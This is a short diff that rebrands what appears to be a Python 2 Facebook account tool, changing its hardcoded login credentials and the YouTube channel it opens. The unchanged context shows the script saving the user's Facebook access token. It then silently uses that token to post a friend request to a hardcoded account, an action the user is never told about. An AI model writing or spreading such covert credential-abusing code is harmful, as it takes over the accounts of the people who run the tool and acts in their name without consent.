@@ -104,8 +104,8 @@ jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈
 jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")
 print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin Raza\033[1;95m♡╰──────────•◈•──────────╯♡"
 
-CorrectUsername = "Raza"
-CorrectPassword = "Raza"
+CorrectUsername = "MOHD"
+CorrectPassword = "NADEEM"
 
 loop = 'true'
 while (loop == 'true'):
@@ -165,7 +165,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UC9je9oH-o4qUsp7NkXn16yQ')
+				os.system('xdg-open https://m.youtube.com/channel/UC7lJ3AWI2GCbCwqtCn6cLiQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
